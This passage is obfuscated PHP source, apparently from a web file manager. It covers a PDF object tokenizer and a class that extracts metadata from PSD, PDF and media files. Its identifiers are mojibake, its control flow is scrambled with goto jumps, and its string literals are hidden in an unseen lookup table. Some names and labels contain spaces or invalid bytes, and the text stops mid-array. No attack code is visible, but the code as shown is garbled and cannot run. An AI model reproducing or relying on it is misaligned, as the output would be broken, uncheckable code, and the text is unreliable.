self::getRawObject($cùŒ…„ˆÕê, $a‚ÇÙóôŠ); if ($fÉšøè Ø >= $DÒÂø£ÊÅ) { $BÁ“Ê¶¼Á[2] = $BÁ“Ê¶¼Á[2] + $DÒÂø£ÊÅ; } else { if ($fÉšøè Ø > $B±°œŠ¤éÃ && $fÉšøè Ø <= $DÒÂø£ÊÅ) { $BÁ“Ê¶¼Á[2] = $BÁ“Ê¶¼Á[2] + $fÉšøè Ø; } } return $BÁ“Ê¶¼Á; goto DÑºîÛ„Æö; DÑºîÛ„Æö: } private static function decodeStr($B‚óËÀê”¿) { goto CŠöì•­ÏÕ; B¹ßó•ì²š: $B‚óËÀê”¿ = $C­Ñ¨Ÿ¿­‹[33]; foreach ($B®‡¿ïÈÎÖ as $bˆ£éÙ‰òÜ) { if (preg_match($C­Ñ¨Ÿ¿­‹[1584], $bˆ£éÙ‰òÜ) && !1 === stripos($bˆ£éÙ‰òÜ, $C­Ñ¨Ÿ¿­‹[1585])) { $bˆ£éÙ‰òÜ = preg_replace($C­Ñ¨Ÿ¿­‹[1586], $C­Ñ¨Ÿ¿­‹[33], $bˆ£éÙ‰òÜ); $bˆ£éÙ‰òÜ = trim($bˆ£éÙ‰òÜ, $C­Ñ¨Ÿ¿­‹[925]); $bˆ£éÙ‰òÜ = pack($C­Ñ¨Ÿ¿­‹[1587], $bˆ£éÙ‰òÜ); $B‚óËÀê”¿ .= $bˆ£éÙ‰òÜ; } else { $B‚óËÀê”¿ .= $bˆ£éÙ‰òÜ; } } if (preg_match($C­Ñ¨Ÿ¿­‹[1588], $B‚óËÀê”¿)) { $cŸÑš“Âå– = substr($B‚óËÀê”¿, 2); $B‚óËÀê”¿ = $C­Ñ¨Ÿ¿­‹[33]; $Dç¯Í¨êêê = strlen($cŸÑš“Âå–); for ($b´Õ™£ô› = 0; $b´Õ™£ô› < $Dç¯Í¨êêê; $b´Õ™£ô› += 2) { $BŠè®®ˆŸŒ = hexdec(bin2hex(substr($cŸÑš“Âå–, $b´Õ™£ô›, 2))); $B‚óËÀê”¿ .= mb_convert_encoding($C­Ñ¨Ÿ¿­‹[1589] . intval($BŠè®®ˆŸŒ) . $C­Ñ¨Ÿ¿­‹[67], $C­Ñ¨Ÿ¿­‹[1590], $C­Ñ¨Ÿ¿­‹[1591]); } } goto B“Ş„Ä‘; CÀµ¿æ«×—: $B‚óËÀê”¿ = $C­Ñ¨Ÿ¿­‹[33]; foreach ($B®‡¿ïÈÎÖ as $bˆ£éÙ‰òÜ) { if (preg_match($C­Ñ¨Ÿ¿­‹[1581], $bˆ£éÙ‰òÜ)) { $B‚óËÀê”¿ .= \chr(hexdec(trim($bˆ£éÙ‰òÜ, $C­Ñ¨Ÿ¿­‹[1582]))); } else { $B‚óËÀê”¿ .= $bˆ£éÙ‰òÜ; } } $B®‡¿ïÈÎÖ = preg_split($C­Ñ¨Ÿ¿­‹[1583], $B‚óËÀê”¿, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B¹ßó•ì²š; CŠöì•­ÏÕ: $C­Ñ¨Ÿ¿­‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $B‚óËÀê”¿ = str_replace(array($C­Ñ¨Ÿ¿­‹[1570], $C­Ñ¨Ÿ¿­‹[1571], $C­Ñ¨Ÿ¿­‹[1572], $C­Ñ¨Ÿ¿­‹[1573], $C­Ñ¨Ÿ¿­‹[1574], $C­Ñ¨Ÿ¿­‹[1575], $C­Ñ¨Ÿ¿­‹[1576], $C­Ñ¨Ÿ¿­‹[1577]), array($C­Ñ¨Ÿ¿­‹[93], $C­Ñ¨Ÿ¿­‹[50], $C­Ñ¨Ÿ¿­‹[8], $C­Ñ¨Ÿ¿­‹[248], $C­Ñ¨Ÿ¿­‹[816], $C­Ñ¨Ÿ¿­‹[217], $C­Ñ¨Ÿ¿­‹[991], $C­Ñ¨Ÿ¿­‹[330]), $B‚óËÀê”¿); $B®‡¿ïÈÎÖ = preg_split($C­Ñ¨Ÿ¿­‹[1578], $B‚óËÀê”¿, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E¾‡ŸÚ‘Ç®; B“Ş„Ä‘: return $B‚óËÀê”¿; goto EĞ¾¥Ê‰; E¾‡ŸÚ‘Ç®: $B‚óËÀê”¿ = $C­Ñ¨Ÿ¿­‹[33]; foreach ($B®‡¿ïÈÎÖ as $bˆ£éÙ‰òÜ) { if (preg_match($C­Ñ¨Ÿ¿­‹[1579], $bˆ£éÙ‰òÜ)) { $B‚óËÀê”¿ .= \chr(octdec(trim($bˆ£éÙ‰òÜ, $C­Ñ¨Ÿ¿­‹[93]))); } else { $B‚óËÀê”¿ .= $bˆ£éÙ‰òÜ; } } $B®‡¿ïÈÎÖ = preg_split($C­Ñ¨Ÿ¿­‹[1580], $B‚óËÀê”¿, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CÀµ¿æ«×—; EĞ¾¥Ê‰: } private static function getRawObject($d‚¢ÓòÓ, $CŠ“¨©à´ = 0) { goto CÕ™ŒÄ˜†Œ; d‘Š„¨˜Ô’: $CŠ“¨©à´ += strspn($d‚¢ÓòÓ, $cÒ‰§Àğá±[1592], $CŠ“¨©à´); $AÈ»¸šÀÍí = $d‚¢ÓòÓ[$CŠ“¨©à´]; switch ($AÈ»¸šÀÍí) { case $cÒ‰§Àğá±[1593]: $eîãïğ¿ù… = strcspn($d‚¢ÓòÓ, $cÒ‰§Àğá±[1594], $CŠ“¨©à´); if ($eîãïğ¿ù… > 0) { $CŠ“¨©à´ += $eîãïğ¿ù…; return self::getRawObject($d‚¢ÓòÓ, $CŠ“¨©à´); } break; case $cÒ‰§Àğá±[8]: $d«†Ÿº½ = $AÈ»¸šÀÍí; ++$CŠ“¨©à´; $cÚ±ìÙ»¦Ì = preg_match($cÒ‰§Àğá±[1595], substr($d‚¢ÓòÓ, $CŠ“¨©à´, 256), $aÑ—ôÉˆŠ¨); if (1 == $cÚ±ìÙ»¦Ì) { $AÑ¡ËÛÛã± = $aÑ—ôÉˆŠ¨[1]; $CŠ“¨©à´ += strlen($AÑ¡ËÛÛã±); } break; case $cÒ‰§Àğá±[248]: case $cÒ‰§Àğá±[816]: $d«†Ÿº½ = $AÈ»¸šÀÍí; ++$CŠ“¨©à´; $A¿²¢ÄÈ‹æ = $CŠ“¨©à´; if ($cÒ‰§Àğá±[248] == $AÈ»¸šÀÍí) { $f¬¨×­é·Å = 1; while ($f¬¨×­é·Å > 0) { if (!isset($d‚¢ÓòÓ[$A¿²¢ÄÈ‹æ])) { break; } $aÇÈÉºŒèµ = $d‚¢ÓòÓ[$A¿²¢ÄÈ‹æ]; switch ($aÇÈÉºŒèµ) { case $cÒ‰§Àğá±[93]: ++$A¿²¢ÄÈ‹æ; break; case $cÒ‰§Àğá±[248]: ++$f¬¨×­é·Å; break; case $cÒ‰§Àğá±[816]: --$f¬¨×­é·Å; break; } ++$A¿²¢ÄÈ‹æ; } $AÑ¡ËÛÛã± = substr($d‚¢ÓòÓ, $CŠ“¨©à´, $A¿²¢ÄÈ‹æ - $CŠ“¨©à´ - 1); $CŠ“¨©à´ = $A¿²¢ÄÈ‹æ; } break; case $cÒ‰§Àğá±[157]: case $cÒ‰§Àğá±[476]: $d«†Ÿº½ = $AÈ»¸šÀÍí; ++$CŠ“¨©à´; if ($cÒ‰§Àğá±[157] == $AÈ»¸šÀÍí) { $AÑ¡ËÛÛã± = array(); do { $eóóò¡š¦È = $CŠ“¨©à´; $BäÎ÷÷±ø¢ = self::getRawObject($d‚¢ÓòÓ, $CŠ“¨©à´); $CŠ“¨©à´ = $BäÎ÷÷±ø¢[2]; $AÑ¡ËÛÛã±[] = $BäÎ÷÷±ø¢; } while ($cÒ‰§Àğá±[476] != $BäÎ÷÷±ø¢[0] && $CŠ“¨©à´ != $eóóò¡š¦È); array_pop($AÑ¡ËÛÛã±); } break; case $cÒ‰§Àğá±[924]: case $cÒ‰§Àğá±[927]: if (isset($d‚¢ÓòÓ[$CŠ“¨©à´ + 1]) && $d‚¢ÓòÓ[$CŠ“¨©à´ + 1] == $AÈ»¸šÀÍí) { $d«†Ÿº½ = $AÈ»¸šÀÍí . $AÈ»¸šÀÍí; $CŠ“¨©à´ += 2; if ($cÒ‰§Àğá±[924] == $AÈ»¸šÀÍí) { $AÑ¡ËÛÛã± = array(); do { $eóóò¡š¦È = $CŠ“¨©à´; $BäÎ÷÷±ø¢ = self::getRawObject($d‚¢ÓòÓ, $CŠ“¨©à´); $CŠ“¨©à´ = $BäÎ÷÷±ø¢[2]; $AÑ¡ËÛÛã±[] = $BäÎ÷÷±ø¢; } while ($cÒ‰§Àğá±[1596] != $BäÎ÷÷±ø¢[0] && $CŠ“¨©à´ != $eóóò¡š¦È); array_pop($AÑ¡ËÛÛã±); } } else { $d«†Ÿº½ = $AÈ»¸šÀÍí; ++$CŠ“¨©à´; $cÚ±ìÙ»¦Ì = preg_match($cÒ‰§Àğá±[1597], substr($d‚¢ÓòÓ, $CŠ“¨©à´), $aÑ—ôÉˆŠ¨); if ($cÒ‰§Àğá±[924] == $AÈ»¸šÀÍí && 1 == $cÚ±ìÙ»¦Ì) { $AÑ¡ËÛÛã± = strtr($aÑ—ôÉˆŠ¨[1], $cÒ‰§Àğá±[1598], $cÒ‰§Àğá±[33]); $CŠ“¨©à´ += \strlen($aÑ—ôÉˆŠ¨[0]); } elseif (!1 !== ($C•±ù†ãÔí = strpos($d‚¢ÓòÓ, $cÒ‰§Àğá±[927], $CŠ“¨©à´))) { $CŠ“¨©à´ = $C•±ù†ãÔí + 1; } } break; default: if ($cÒ‰§Àğá±[1599] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 6)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1599]; $CŠ“¨©à´ += 6; } elseif ($cÒ‰§Àğá±[99] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 4)) { $d«†Ÿº½ = $cÒ‰§Àğá±[99]; $CŠ“¨©à´ += 4; $AÑ¡ËÛÛã± = $cÒ‰§Àğá±[99]; } elseif ($cÒ‰§Àğá±[1600] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 4)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1601]; $CŠ“¨©à´ += 4; $AÑ¡ËÛÛã± = $cÒ‰§Àğá±[1600]; } elseif ($cÒ‰§Àğá±[1602] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 5)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1601]; $CŠ“¨©à´ += 5; $AÑ¡ËÛÛã± = $cÒ‰§Àğá±[1602]; } elseif ($cÒ‰§Àğá±[1603] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 6)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1603]; $CŠ“¨©à´ += 6; if (1 == preg_match($cÒ‰§Àğá±[1604], substr($d‚¢ÓòÓ, $CŠ“¨©à´), $aÑ—ôÉˆŠ¨)) { $CŠ“¨©à´ += strlen($aÑ—ôÉˆŠ¨[0]); $eÖÙ¡±ë«¶ = $cÒ‰§Àğá±[1605]; $cÚ±ìÙ»¦Ì = preg_match($eÖÙ¡±ë«¶, substr($d‚¢ÓòÓ, $CŠ“¨©à´), $aÑ—ôÉˆŠ¨, PREG_OFFSET_CAPTURE); if (1 == $cÚ±ìÙ»¦Ì) { $AÑ¡ËÛÛã± = substr($d‚¢ÓòÓ, $CŠ“¨©à´, $aÑ—ôÉˆŠ¨[0][1]); $CŠ“¨©à´ += $aÑ—ôÉˆŠ¨[1][1]; } } } elseif ($cÒ‰§Àğá±[1606] == substr($d‚¢ÓòÓ, $CŠ“¨©à´, 9)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1606]; $CŠ“¨©à´ += 9; } elseif (1 == preg_match($cÒ‰§Àğá±[1607], substr($d‚¢ÓòÓ, $CŠ“¨©à´, 33), $aÑ—ôÉˆŠ¨)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1569]; $CŠ“¨©à´ += strlen($aÑ—ôÉˆŠ¨[0]); $AÑ¡ËÛÛã± = intval($aÑ—ôÉˆŠ¨[1]) . $cÒ‰§Àğá±[70] . intval($aÑ—ôÉˆŠ¨[2]); } elseif (1 == preg_match($cÒ‰§Àğá±[1608], substr($d‚¢ÓòÓ, $CŠ“¨©à´, 33), $aÑ—ôÉˆŠ¨)) { $d«†Ÿº½ = $cÒ‰§Àğá±[1609]; $AÑ¡ËÛÛã± = intval($aÑ—ôÉˆŠ¨[1]) . $cÒ‰§Àğá±[70] . intval($aÑ—ôÉˆŠ¨[2]); $CŠ“¨©à´ += strlen($aÑ—ôÉˆŠ¨[0]); } elseif (($c¦ÄŸ•Àæñ = strspn($d‚¢ÓòÓ, $cÒ‰§Àğá±[1610], $CŠ“¨©à´)) > 0) { $d«†Ÿº½ = $cÒ‰§Àğá±[1611]; $AÑ¡ËÛÛã± = substr($d‚¢ÓòÓ, $CŠ“¨©à´, $c¦ÄŸ•Àæñ); $CŠ“¨©à´ += $c¦ÄŸ•Àæñ; } break; } goto Eºî „‡•¿; Eºî „‡•¿: return array($d«†Ÿº½, $AÑ¡ËÛÛã±, $CŠ“¨©à´); goto EÇ„²ø–ÎÏ; CÕ™ŒÄ˜†Œ: $cÒ‰§Àğá± =& $_SERVER[¼€¼ˆ¦‚¡]; $d«†Ÿº½ = $cÒ‰§Àğá±[33]; $AÑ¡ËÛÛã± = $cÒ‰§Àğá±[33]; goto d‘Š„¨˜Ô’; EÇ„²ø–ÎÏ: } } class GetInfo { private static $fileTypeArray; public static function get($f¬šˆÓ‹Ó©) { $c‘®ÄÈùäŞ = IO::info($f¬šˆÓ‹Ó©); return self::infoAdd($c‘®ÄÈùäŞ); } public static function infoAdd(&$b¸¯¶ŞÓ) { goto b£ëÔ¾ã¥¦; DèÜƒ ¾Şè: $bˆÑäëìÆÊ = $b¸¯¶ŞÓ[$C­ñÄù‹ğ[160]]; try { if ($b¸¯¶ŞÓ[$C­ñÄù‹ğ[160]] == $C­ñÄù‹ğ[1614]) { $fæõäÅä° = self::psdParse($d‹¡¹Êï¥ì); $bˆÑäëìÆÊ = $C­ñÄù‹ğ[1615]; } else { if ($b¸¯¶ŞÓ[$C­ñÄù‹ğ[160]] == $C­ñÄù‹ğ[1616]) { $fæõäÅä° = self::pdfParse($d‹¡¹Êï¥ì); } else { $bˆÑäëìÆÊ = self::$fileTypeArray[$C­ñÄù‹ğ[1617]][$b¸¯¶ŞÓ[$C­ñÄù‹ğ[160]]]; $d¹ÃéŞœÀ = self::$fileTypeArray[$C­ñÄù‹ğ[1618]][$bˆÑäëìÆÊ][$C­ñÄù‹ğ[1619]]; $d†®‰¨Ã¢½ = @$cõ‹òœ–ù“->analyze($d‹¡¹Êï¥ì, $b¸¯¶ŞÓ[$C­ñÄù‹ğ[77]], $b¸¯¶ŞÓ[$C­ñÄù‹ğ[28]]); $fæõäÅä° = self::parseData($d†®‰¨Ã¢½, $d¹ÃéŞœÀ, $b¸¯¶ŞÓ); } } } catch (Exception $fÁç«¯‘Ö¹) { $fæõäÅä° = array($C­ñÄù‹ğ[372] => $bˆÑäëìÆÊ); } if (!$fæõäÅä°) { return; } goto cÊ–Ù”ç¿; b£ëÔ¾ã¥¦: $C­ñÄù‹ğ =& $_SERVER[¼€¼ˆ¦‚¡]; static $cõ‹òœ–ù“; if (!$cõ‹òœ–ù“) { require SDK_DIR . $C­ñÄù‹ğ[1612]; $cõ‹òœ–ù“ = new getID3(); } goto E¯‘ˆÒé´ø; cÊ–Ù”ç¿: $fæõäÅä°[$C­ñÄù‹ğ[372]] = $bˆÑäëìÆÊ; $b¸¯¶ŞÓ[$C­ñÄù‹ğ[426]] = $fæõäÅä°; return $b¸¯¶ŞÓ; goto Cù¿ ±à¼Ğ; E¯‘ˆÒé´ø: if (!$b¸¯¶ŞÓ || $b¸¯¶ŞÓ[$C­ñÄù‹ğ[29]] != $C­ñÄù‹ğ[167]) { return; } if (!self::support($b¸¯¶ŞÓ[$C­ñÄù‹ğ[160]]) || isset($b¸¯¶ŞÓ[$C­ñÄù‹ğ[426]])) { return; } $d‹¡¹Êï¥ì = $C­ñÄù‹ğ[1613] . $b¸¯¶ŞÓ[$C­ñÄù‹ğ[75]]; goto DèÜƒ ¾Şè; Cù¿ ±à¼Ğ: } public static function support($D²ÒŠ„Ü¹) { goto bÏï³¾“­¤; bÏï³¾“­¤: $CØßÙò†Ÿ÷ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $D²ÒŠ„Ü¹ = strtolower($D²ÒŠ„Ü¹); goto CÎ¾Í÷ŞïÎ; CÎ¾Í÷ŞïÎ: $bàÅŞİ’Ûõ = array($CØßÙò†Ÿ÷[1616], $CØßÙò†Ÿ÷[1614]); if (in_array($D²ÒŠ„Ü¹, $bàÅŞİ’Ûõ)) { return !0; } if (isset(self::$fileTypeArray[$CØßÙò†Ÿ÷[1617]][$D²ÒŠ„Ü¹])) { return !0; } goto Aß¦÷ëöÎ; Aß¦÷ëöÎ: return !1; goto c¥‘·™‡¾º; c¥‘·™‡¾º: } private static function parseData($aãŞ­Ì±Å‰, $F›ó†‚Œ, $då‰™Æäá³) { $dÉšñŒùÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $A‘á„™áìÈ = $aãŞ­Ì±Å‰[$dÉšñŒùÜ[1620]]; $D§ƒï‡Š İ = array(); foreach ($F›ó†‚Œ as $B‡ˆ‚–·ë => $d“ŠÅ·È«ƒ) { foreach ($d“ŠÅ·È«ƒ as $F ç‚ªö™ˆ) { if (is_array($F ç‚ªö™ˆ)) { $aè°óÛäŠˆ = self::parseData($aãŞ­Ì±Å‰, $d“ŠÅ·È«ƒ, $då‰™Æäá³); if ($aè°óÛäŠˆ) { $D§ƒï‡Š İ[$B‡ˆ‚–·ë] = $aè°óÛäŠˆ; } break; } $bäË„–½Ãä = str_replace($dÉšñŒùÜ[1389], $A‘á„™áìÈ, $F ç‚ªö™ˆ); $aè°óÛäŠˆ = _get($aãŞ­Ì±Å‰, $bäË„–½Ãä); $aè°óÛäŠˆ = is_array($aè°óÛäŠˆ) ? $aè°óÛäŠˆ[0] : $aè°óÛäŠˆ; if ($aè°óÛäŠˆ) { break; } } if ($aè°óÛäŠˆ || $aè°óÛäŠˆ === 0 || $aè°óÛäŠˆ === !1) { $aè°óÛäŠˆ = self::valueReset($F ç‚ªö™ˆ, $aè°óÛäŠˆ, $B‡ˆ‚–·ë); if ($aè°óÛäŠˆ !== null) { $D§ƒï‡Š İ[$B‡ˆ‚–·ë] = $aè°óÛäŠˆ; } } } $D§ƒï‡Š İ = self::valueResetAll($D§ƒï‡Š İ, $då‰™Æäá³); return $D§ƒï‡Š İ; } private static function psdParse($D†•Ô¦ÇÏÎ) { $bÆŠÕÖ³á¹ =& $_SERVER[¼€¼ˆ¦‚¡]; if (IO::fileSubstr($D†•Ô¦ÇÏÎ, 0, 4) != $bÆŠÕÖ³á¹[1621]) { return !1; } $aÒ­Á­ºéˆ = getImageSize($D†•Ô¦ÇÏÎ, $Eˆ®±­÷µŞ); if (!$aÒ­Á­ºéˆ) { return; } $c·Ù£Œ…ËÍ = array($bÆŠÕÖ³á¹[1536] => $aÒ­Á­ºéˆ[0], $bÆŠÕÖ³á¹[1538] => $aÒ­Á­ºéˆ[1]); return $c·Ù£Œ…ËÍ; } private static function pdfParse($dµ¥¶º¼) { return FileParsePdf::parse($dµ¥¶º¼); } private static function fileTypeParse() { $b¦µ†³·ã· =& $_SERVER[¼€¼ˆ¦‚¡]; $A‰Ã¿Ô¬­¥ = self::fileTypeArray(); $E¦ŸŸÊÖ = array(); foreach ($A‰Ã¿Ô¬­¥ as $fëÆÚéÎÊ³ => $E¢•Üµ†™) { $c»Ï»¶ÈˆÚ = _get($E¢•Üµ†™, $b¦µ†³·ã·[160], $b¦µ†³·ã·[33]); $a¥ÜŠÆå“ = is_string($c»Ï»¶ÈˆÚ) ? explode($b¦µ†³·ã·[47], $c»Ï»¶ÈˆÚ) : $c»Ï»¶ÈˆÚ; if (!$a¥ÜŠÆå“) { continue; } foreach ($a¥ÜŠÆå“ as $c»Ï»¶ÈˆÚ) { $c»Ï»¶ÈˆÚ = strtolower(trim($c»Ï»¶ÈˆÚ)); if (!$c»Ï»¶ÈˆÚ) { continue; } $E¦ŸŸÊÖ[$c»Ï»¶ÈˆÚ] = $fëÆÚéÎÊ³; } $A‰Ã¿Ô¬­¥[$fëÆÚéÎÊ³][$b¦µ†³·ã·[160]] = array_keys($E¦ŸŸÊÖ); $A‰Ã¿Ô¬­¥[$fëÆÚéÎÊ³][$b¦µ†³·ã·[1619]] = self::parseKeyMap($E¢•Üµ†™[$b¦µ†³·ã·[1619]]); } return array($b¦µ†³·ã·[1618] => $A‰Ã¿Ô¬­¥, $b¦µ†³·ã·[1617] => $E¦ŸŸÊÖ); } private static function parseKeyMap($a“²—¿„šø) { $cµÜ¢œÏßª =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($a“²—¿„šø as $E‘Äö¯…•ë => $F¶¾ÊÆ»÷) { if (is_array($F¶¾ÊÆ»÷)) { $eÇ±ß™‹¬ = self::parseKeyMap($F¶¾ÊÆ»÷); if ($eÇ±ß™‹¬) { $a“²—¿„šø[$E‘Äö¯…•ë] = $eÇ±ß™‹¬; } continue; } $AÑŞŒÏèó = explode($cµÜ¢œÏßª[47], $F¶¾ÊÆ»÷); $cÉÔÅôÖš = array(); foreach ($AÑŞŒÏèó as $EµÆ¥‘‡ÇË) { $EµÆ¥‘‡ÇË = trim($EµÆ¥‘‡ÇË); if (!$EµÆ¥‘‡ÇË) { continue; } if (preg_match($cµÜ¢œÏßª[1622], $EµÆ¥‘‡ÇË, $cÛÓî‰ŠÉé)) { $B˜©°Ò“Ã = explode($cµÜ¢œÏßª[271], $cÛÓî‰ŠÉé[1]); foreach ($B˜©°Ò“Ã as $eŸ·Êã™ƒÛ) { $cÉÔÅôÖš[] = str_replace($cÛÓî‰ŠÉé[0], $eŸ·Êã™ƒÛ, $EµÆ¥‘‡ÇË); } } else { $cÉÔÅôÖš[] = $EµÆ¥‘‡ÇË; } } $a“²—¿„šø[$E‘Äö¯…•ë] = $cÉÔÅôÖš; } return $a“²—¿„šø; } private static function valueResetAll($BÜ¨ˆ¾¸Ş², $BÒè’ãê˜„) { goto BãÕĞœ„ææ; fÌâô³Ãñç: $B„››ÌÈŠ = _get($BÜ¨ˆ¾¸Ş², $B˜¸İ—èó[1635], $B˜¸İ—èó[33]); $B²†Ì¦Î = $C°ñ¨ãçÅš . $FÕ‡¾ÚÁğÏ . $B„››ÌÈŠ; if ($B²†Ì¦Î && get_charset($B²†Ì¦Î) != $B˜¸İ—èó[326]) { $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1342]] = iconv_to($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1342]], get_charset($B²†Ì¦Î), $B˜¸İ—èó[326]); $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1636]] = iconv_to($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1636]], get_charset($B²†Ì¦Î), $B˜¸İ—èó[326]); $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1637]] = iconv_to($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1637]], get_charset($B²†Ì¦Î), $B˜¸İ—èó[326]); } goto b—¢ƒ£Ó–«; BÆöµ´ôíê: if ($c”Ò‰’›¥Ï) { $b³ÍÚÄ¬Øƒ = IO_PATH_SYSTEM_TEMP . $B˜¸İ—èó[1628] . KodIO::hashPath($BÒè’ãê˜„) . $B˜¸İ—èó[1629]; $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1630]] = Action($B˜¸İ—èó[1631])->pluginCacheFileSet($b³ÍÚÄ¬Øƒ, $c”Ò‰’›¥Ï); unset($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1632]][$B˜¸İ—èó[1615]]); } $C°ñ¨ãçÅš = _get($BÜ¨ˆ¾¸Ş², $B˜¸İ—èó[1633], $B˜¸İ—èó[33]); $FÕ‡¾ÚÁğÏ = _get($BÜ¨ˆ¾¸Ş², $B˜¸İ—èó[1634], $B˜¸İ—èó[33]); goto fÌâô³Ãñç; b—¢ƒ£Ó–«: return $BÜ¨ˆ¾¸Ş²; goto eÄí›¬äº; BãÕĞœ„ææ: $B˜¸İ—èó =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1623]])) { $cšññ˜İ¹ = ceil($BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1623]]); $Bç‡¹İ£Ş‹ = intval($cšññ˜İ¹ / 3600); $eôš¤è×Ë = intval(($cšññ˜İ¹ - $Bç‡¹İ£Ş‹ * 3600) / 60); $B——­¶¼° = $cšññ˜İ¹ % 60; $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1624]] = sprintf($B˜¸İ—èó[1625], $Bç‡¹İ£Ş‹, $eôš¤è×Ë, $B——­¶¼°); if ($Bç‡¹İ£Ş‹ == 0) { $BÜ¨ˆ¾¸Ş²[$B˜¸İ—èó[1624]] = sprintf($B˜¸İ—èó[1626], $eôš¤è×Ë, $B——­¶¼°); } } $c”Ò‰’›¥Ï = _get($BÜ¨ˆ¾¸Ş², $B˜¸İ—èó[1627]); goto BÆöµ´ôíê; eÄí›¬äº: } private static function valueReset($fùÃÍÄç…, $cºíÏèâí°, $d×¨¨ö) { $B•°ƒêì„‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $f”ŞÄâŒ„’ = $B•°ƒêì„‹[1553]; switch ($fùÃÍÄç…) { case $B•°ƒêì„‹[1638]: $cºíÏèâí° = $cºíÏèâí° == $B•°ƒêì„‹[83] ? $B•°ƒêì„‹[1639] : $B•°ƒêì„‹[1640]; break; case $B•°ƒêì„‹[1641]: $cºíÏèâí° = $cºíÏèâí° ? $cºíÏèâí° : null; break; default: break; } switch ($d×¨¨ö) { case $B•°ƒêì„‹[1642]: $cºíÏèâí° = round($cºíÏèâí°, 2); break; case $B•°ƒêì„‹[187]: case $B•°ƒêì„‹[107]: if ($cºíÏèâí° < 0) { $cºíÏèâí° = null; } else { if (is_numeric($cºíÏèâí°)) { $cºíÏèâí° = date($f”ŞÄâŒ„’, $cºíÏèâí°); } } break; default: break; } return $cºíÏèâí°; } private static function fileTypeArray() { $F¨¿Ûî„© =& $_SERVER[¼€¼ˆ¦‚¡]; return array($F¨¿Ûî„©[1615] => array($F¨¿Ûî„©[160] => $F¨¿Ûî„©[1643] . $F¨¿Ûî„©[1644], $F¨¿Ûî„©[1619] => array($F¨¿Ûî„©[1536] => $F¨¿Ûî„©[1645], $F¨¿Ûî„©[1538] => $F¨¿Ûî„©[1646], $F¨¿Ûî„©[1647] => $F¨¿Ûî„©[1648], $F¨¿Ûî„©[1649] => $F¨¿Ûî„©[1650], $F¨¿Ûî„©[187] => $F¨¿Ûî„©[1651], $F¨¿Ûî„©[107] => $F¨¿Ûî„©[1652], $F¨¿Ûî„©[1653] => $F¨¿Ûî„©[1654], $F¨¿Ûî„©[1655] => $F¨¿Ûî„©[1656], $F¨¿Ûî„©[1657] => $F¨¿Ûî„©[1658], $F¨¿Ûî„©[1659] => $F¨¿Ûî„©[1660], $F¨¿Ûî„©[1661] => $F¨¿Ûî„©[1662], $F¨¿Ûî„©[1663] => $F¨¿Ûî„©[1664], $F¨¿Ûî„©[1665] => $F¨¿Ûî„©[1666], $F¨¿Ûî„©[1667] => array($F¨¿Ûî„©[1668] => $F¨¿Ûî„©[1669], $F¨¿Ûî„©[1670] => $F¨¿Ûî„©[1671], $F¨¿Ûî„©[1672] => $F¨¿Ûî„©[1673]), $F¨¿Ûî„©[1674] => $F¨¿Ûî„©[1675], $F¨¿Ûî„©[1676] => $F¨¿Ûî„©[1677], $F¨¿Ûî„©[1678] => $F¨¿Ûî„©[1679], $F¨¿Ûî„©[1680] => $F¨¿Ûî„©[1681], $F¨¿Ûî„©[1682] => array($F¨¿Ûî„©[1683] => $F¨¿Ûî„©[1684], $F¨¿Ûî„©[1685] => $F¨¿Ûî„©[1686], $F¨¿Ûî„©[1687] => $F¨¿Ûî„©[1688], $F¨¿Ûî„©[1689] => $F¨¿Ûî„©[1690], $F¨¿Ûî„©[1691] => $F¨¿Ûî„©[1692], $F¨¿Ûî„©[1693] => $F¨¿Ûî„©[1694], $F¨¿Ûî„©[1695] => $F¨¿Ûî„©[1696], $F¨¿Ûî„©[1697] => $F¨¿Ûî„©[1698], $F¨¿Ûî„©[1699] => $F¨¿Ûî„©[1700], $F¨¿Ûî„©[1701] => $F¨¿Ûî„©[1702], $F¨¿Ûî„©[1703] => $F¨¿Ûî„©[1704]))), $F¨¿Ûî„©[1705] => array($F¨¿Ûî„©[160] => $F¨¿Ûî„©[1706] . $F¨¿Ûî„©[1707], $F¨¿Ûî„©[1619] => array($F¨¿Ûî„©[1623] => $F¨¿Ûî„©[1708], $F¨¿Ûî„©[187] => $F¨¿Ûî„©[1709], $F¨¿Ûî„©[107] => $F¨¿Ûî„©[1710], $F¨¿Ûî„©[1655] => $F¨¿Ûî„©[1711], $F¨¿Ûî„©[1712] => $F¨¿Ûî„©[1713], $F¨¿Ûî„©[1714] => $F¨¿Ûî„©[1641], $F¨¿Ûî„©[1715] => $F¨¿Ûî„©[1716], 